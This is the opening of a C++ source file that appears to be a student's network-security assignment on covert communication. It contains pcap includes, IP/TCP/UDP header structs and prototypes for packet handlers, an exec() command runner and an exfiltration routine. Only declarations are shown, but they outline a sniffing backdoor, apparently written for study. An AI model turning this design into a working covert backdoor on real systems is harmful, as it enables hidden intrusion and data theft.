/*******************************************************************************
**
**  Author:   Mario Enriquez,   A00909441
**  Class:    COMP_8505
**  Title:    Final Assignment, Covert Communication
**
**  Notes:
**        -Based on the code from Rowland and Aman Abdullah
**
*******************************************************************************/

#include <stdio.h>
#include <fstream>
#include <iostream>
#include <string>
#include <string.h>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/types.h>
#include <pcap.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <thread>
#include <signal.h>

#define SIZE_ETHERNET 14

#ifndef ETHER_HDRLEN
#define ETHER_HDRLEN 14
#endif

using std::cout;
using std::endl;
using std::string;

u_int16_t handle_ethernet (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char* packet);
void handle_IP (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char*, char*, char*,int[], int);
void handle_TCP (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char*, char*, char*, int[], int);
void handle_UDP (u_char *args,const struct pcap_pkthdr* pkthdr,const u_char*, char*, char*, int[], int);
std::string exec(char*);
void exfilt_main (char*,char*,char*,int []);

struct my_ip {
	u_int8_t	ip_vhl;		/* header length, version */
#define IP_V(ip)	(((ip)->ip_vhl & 0xf0) >> 4)
#define IP_HL(ip)	((ip)->ip_vhl & 0x0f)
	u_int8_t	ip_tos;		/* type of service */
	u_int16_t	ip_len;		/* total length */
	u_int16_t	ip_id;		/* identification */
	u_int16_t	ip_off;		/* fragment offset field */
#define	IP_DF 0x4000			/* dont fragment flag */
#define	IP_MF 0x2000			/* more fragments flag */
#define	IP_OFFMASK 0x1fff		/* mask for fragmenting bits */
	u_int8_t	ip_ttl;		/* time to live */
	u_int8_t	ip_p;		/* protocol */
	u_int16_t	ip_sum;		/* checksum */
	struct in_addr ip_src; /*src address*/
	struct in_addr ip_dst;	/* dest address */
};

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
        u_short th_sport;               /* source port */
        u_short th_dport;               /* destination port */
        tcp_seq th_seq;                 /* sequence number */
        tcp_seq th_ack;                 /* acknowledgement number */
        u_char  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_char  th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_short th_win;                 /* window */
        u_short th_sum;                 /* checksum */
        u_short th_urp;                 /* urgent pointer */
};

struct sniff_udp {
        u_short th_sport;               /* source port */
        u_short th_dport;               /* destination port */
        u_short th_win;                 /* window */
        u_short th_len;                 /* checksum */
};
